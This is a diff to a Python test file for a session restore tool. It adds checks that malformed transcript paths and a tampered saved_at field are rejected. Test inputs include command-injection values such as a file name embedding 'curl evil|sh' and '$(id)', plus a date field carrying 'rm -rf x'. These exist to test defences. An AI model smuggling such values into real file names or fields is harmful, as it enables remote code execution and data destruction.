@@ -221,6 +221,9 @@ async def test_restore_without_extraction(vault: Path, extra: str, transcript: s
         ("/x/projects/a'; curl evil|sh; '.jsonl", None, False),
         ("/x/projects/$(id).jsonl", None, False),
         ("x\ny.jsonl", None, False),
+        ("/x/projects/a\u2028b.jsonl", None, False),
+        ("/x/projects/a\u202eb.jsonl", None, False),
+        ("/x/projects/a\x85b.jsonl", None, False),
         ("/x/projects/a.txt", None, False),
     ],
 )
@@ -244,6 +247,20 @@ def test_restore_with_extract_off_still_consumes_the_transcript(
     off = sessions.restore(engine, "fabrik", None, "clear")
 
     assert "extract" not in off and store.LAST_TRANSCRIPT == []
+
+
+async def test_restore_never_puts_a_hand_edited_saved_at_in_the_order(vault: Path) -> None:
+    async with mcp_client(vault) as c:
+        saved = await c.ok("session", action="save", title="Hilo", body=BODY)
+        path = vault / saved["path"]
+        text = path.read_text(encoding="utf-8")
+        saved_at = str(_fm(path)["saved_at"])
+        path.write_text(
+            text.replace(saved_at, "2026-11-18; rm -rf x", 1), encoding="utf-8"
+        )
+        res = await c.ok("session", action="restore", source="compact", transcript=TRANSCRIPT)
+
+    assert "rm -rf" not in res["extract"] and "desde=inicio" in res["extract"]
 
 
 async def test_capture_ignores_an_unsubstituted_placeholder(vault: Path) -> None:
